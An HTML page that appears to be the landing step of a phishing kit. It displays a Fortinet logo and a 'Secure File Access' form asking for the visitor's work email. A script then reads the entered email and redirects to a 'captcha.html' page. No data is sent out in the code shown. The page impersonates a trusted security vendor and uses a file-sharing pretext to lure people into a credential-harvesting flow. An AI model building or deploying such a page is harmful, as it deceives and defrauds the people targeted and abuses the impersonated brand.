<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Secure File Access</title>
    <style>
        body {
            background-color: #f9f9f9;
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 50px;
        }
        .login-box {
            background-color: #fff;
            border-radius: 10px;
            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
            padding: 40px;
            max-width: 400px;
            margin: auto;
        }
        .logo {
            margin-bottom: 20px;
        }
        h2 {
            margin-bottom: 20px;
        }
        input[type="email"] {
            padding: 12px;
            font-size: 16px;
            width: 80%;
            margin-bottom: 20px;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        button {
            padding: 10px 25px;
            font-size: 16px;
            background-color: #007BFF;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        button:hover {
            background-color: #0056b3;
        }
        p {
            color: #555;
        }
    </style>
</head>
<body>
    <div class="login-box">
        <div class="logo">
            <img src="fortinet_logo.png" alt="Fortinet Logo" width="200" />
        </div>
        <h2>Access Secure Shared Files</h2>
        <p>Enter your work email to continue:</p>
        <form id="loginForm">
            <input type="email" id="emailInput" placeholder="you@example.com" required />
            <br />
            <button type="submit">Continue</button>
        </form>
    </div>

    <script>
        document.getElementById("loginForm").addEventListener("submit", function(e) {
            e.preventDefault();
            const email = document.getElementById("emailInput").value;
            window.location.href = "captcha.html";
        });
    </script>
</body>
</html>
